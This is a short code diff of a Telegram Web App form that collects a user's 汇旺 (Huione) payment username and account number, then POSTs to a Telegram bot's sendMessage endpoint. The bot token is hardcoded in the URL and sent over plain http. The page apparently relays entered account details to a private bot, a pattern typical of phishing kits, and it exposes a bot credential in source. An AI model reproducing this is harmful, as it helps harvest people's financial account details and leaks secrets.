@@ -29,16 +29,19 @@
         }).onClick(submit);
 
         function submit() {
-            if (document.getElementById('username').value == '') {
-                alert('请输入汇旺用户名');
+            let id = Telegram.WebApp.initData.id;
+            let account = document.getElementById('account').value;
+            let username = document.getElementById('username').value;
+            if (username.trim() == '') {
+                alert('请输入汇旺用户名' + id);
                 return;
             }
 
-            if (document.getElementById('account').value == '') {
+            if (account.trim() == '') {
                 alert('请输入汇旺账号');
                 return;
             }
-            
+
             const xhr = new XMLHttpRequest();
             xhr.open('POST', 'http://api.telegram.org/bot5858680229:AAEqC1cibJLPbu0HahT0yALK4M_YMeRWf-k/sendMessage');
             xhr.setRequestHeader('Content-Type', 'application/json');
